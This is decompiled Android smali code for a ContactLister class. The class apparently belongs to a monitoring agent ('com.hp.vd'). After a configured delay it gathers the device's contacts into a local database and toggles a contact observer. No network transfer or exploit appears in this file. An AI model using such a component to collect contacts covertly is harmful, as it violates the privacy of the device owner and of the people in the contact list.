.class public Lcom/hp/vd/module/monitor/contact/ContactLister;
.super Ljava/lang/Object;
.source "ContactLister.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "ContactLister"


# instance fields
.field protected contactDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

.field protected contactObserver:Lcom/hp/vd/module/monitor/contact/ContactObserver;

.field protected contentResolver:Landroid/content/ContentResolver;

.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/module/monitor/ContactMonitor;Landroid/content/ContentResolver;Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/contact/ContactObserver;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/module/monitor/ContactMonitor;",
            "Landroid/content/ContentResolver;",
            "Lcom/hp/vd/context/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/module/monitor/contact/ContactObserver;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 35
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 19
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->contentResolver:Landroid/content/ContentResolver;

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->context:Lcom/hp/vd/context/Context;

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->contactDao:Lcom/j256/ormlite/dao/Dao;

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 24
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->contactObserver:Lcom/hp/vd/module/monitor/contact/ContactObserver;

    .line 25
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 36
    iput-object p1, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 37
    iput-object p2, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->contentResolver:Landroid/content/ContentResolver;

    .line 38
    iput-object p3, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->context:Lcom/hp/vd/context/Context;

    .line 39
    iput-object p4, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->contactDao:Lcom/j256/ormlite/dao/Dao;

    .line 40
    iput-object p5, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 41
    iput-object p6, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->contactObserver:Lcom/hp/vd/module/monitor/contact/ContactObserver;

    .line 42
    iput-object p7, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .line 47
    iget-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->contactObserver:Lcom/hp/vd/module/monitor/contact/ContactObserver;

    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/contact/ContactObserver;->deactivate()Z

    .line 50
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "lister_sleep_period"

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    int-to-long v0, v0

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    .line 51
    iget-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "ContactLister"

    const-string v2, "run(): done sleeping."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 53
    iget-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->context:Lcom/hp/vd/context/Context;

    .line 54
    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v0

    new-instance v7, Lcom/hp/vd/module/monitor/contact/ContactCallable;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->context:Lcom/hp/vd/context/Context;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->contactDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->log:Lcom/hp/vd/agent/log/IWriter;

    move-object v1, v7

    invoke-direct/range {v1 .. v6}, Lcom/hp/vd/module/monitor/contact/ContactCallable;-><init>(Lcom/hp/vd/module/monitor/ContactMonitor;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    .line 53
    invoke-static {v0, v7}, Lcom/j256/ormlite/misc/TransactionManager;->callInTransaction(Lcom/j256/ormlite/support/ConnectionSource;Ljava/util/concurrent/Callable;)Ljava/lang/Object;

    .line 64
    iget-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "gather_contacts_on_start"

    const-string v2, "false"

    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 66
    iget-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v0

    .line 67
    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v0, v1}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    .line 69
    iget-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->contactObserver:Lcom/hp/vd/module/monitor/contact/ContactObserver;

    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/contact/ContactObserver;->activate()Z
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    .line 77
    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "ContactLister"

    const-string v3, "run(): Throwable caught during Runnable execution."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_1
    move-exception v0

    .line 72
    iget-object v1, p0, Lcom/hp/vd/module/monitor/contact/ContactLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "ContactLister"

    const-string v3, "run(): InterruptedException caught (maybe while sleeping?) during Runnable execution"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
